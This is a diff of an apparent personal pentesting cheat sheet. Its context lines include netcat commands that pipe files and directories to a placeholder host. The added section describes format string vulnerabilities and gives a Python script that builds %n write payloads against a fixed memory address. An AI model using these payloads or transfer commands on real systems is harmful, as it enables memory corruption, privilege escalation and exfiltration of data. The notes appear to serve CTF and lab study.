@@ -25,6 +25,7 @@ https://tools.kali.org/tools-listing
     gzip -c /tmp/asroot | nc a.b.c.d 1234
     tar czp /tmp/directory | nc a.b.c.d 1234
     nc -l -p 1234 -q 1 < linpeas.sh 
+
 ==transfer file xxd, base64
     
     xxd -p -c 36 binary
@@ -516,3 +517,83 @@ https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limite
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 export SHELL=/bin/bash
 
+
+
+== Desactive ASLR
+
+
+maximize the stack 
+
+```console
+mike@pegasus:~$ ulimit -s
+8192
+mike@pegasus:~$ ulimit -s unlimited
+mike@pegasus:~$ ulimit -s
+unlimited
+```
+
+== Format string vulnerability
+
+```c
+
+#vuln
+printf(string)
+
+#secure
+printf("%s", string)
+
+```
+
+%x : exame stack memory
+%s : read from arbitrary memory address
+%n : write to abitrary memory address
+%4$x ~ %x%x%x%x
+%4$n ~ %x%x%x%x%n
+addr1 +  addr3 + "%48871x%11$hn%8126x%12$hn"
+
+
+```py
+import struct
+
+def p(x):
+        return struct.pack('<L', x)
+
+input0 = "AAAA.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x"
+
+addr = p(0x0804a024)
+
+addr1 = p(0x0804a024)
+addr2 = p(0x0804a025)
+addr3 = p(0x0804a026)
+addr4 = p(0x0804a027)
+
+
+input1 = addr +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.%x"
+input2 = addr +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.%n"
+input3 = addr +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%64x.%n"
+
+#0xaabbccdd
+input4 = addr1 + "JUNK" + addr2+ "JUNK" + addr3 + "JUNK" + addr4 +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%40x.%n%17x%n%17x%n%17x%n"
+
+#0xdeadbeef
+input5 = addr1 + "JUNK" + addr2+ "JUNK" + addr3 + "JUNK" + addr4 +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%109x.%n%207x%n%239x%n%49x%n"
+
+#0x0806abcd
+input6 = addr1 + "JUNK" + addr2+ "JUNK" + addr3 + "JUNK" + addr4 +"0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%08x.0x%75x.%n%222x%n%91x%n%258x%n"
+
+input7 = "AAAA" + "%11$08x"
+input8 = addr  + "%11$n"
+input9 = addr  + "%166x%11$n"
+input10 = addr1 + addr2 + addr3 + addr4 +"%98x%11$n%139x%12$n%194x%13$n%64x%14$n"
+
+
+input11 = addr1 +  addr3 + "%48871x%11$hn%8126x%12$hn"
+
+
+print input11
+
+```
+
+
+== List of current files on git directory
+git ls-tree -r master --name-only
